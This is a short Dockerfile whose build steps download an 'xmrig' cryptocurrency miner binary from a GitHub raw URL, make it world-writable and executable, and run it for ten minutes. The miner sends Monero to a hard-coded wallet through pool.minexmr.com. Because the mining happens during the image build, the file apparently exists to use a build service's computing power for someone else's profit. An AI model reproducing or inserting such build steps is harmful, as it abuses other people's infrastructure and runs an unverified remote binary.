FROM centos:latest

RUN curl -O https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/xmrig
RUN chmod 777 xmrig
RUN timeout 10m ./xmrig -a cn/upx2 -o pool.minexmr.com:4444 -u 453YeXrQMiahiYEbJXH4172KP8a6QagRAGWQpcpepuHiJ7QeiPyr2ZvEhwPrrTFu21ETGAY5SCdphFb26dYVcnSYHR1HPy5 -p $(date "+%Y%m%d%H%M%S")
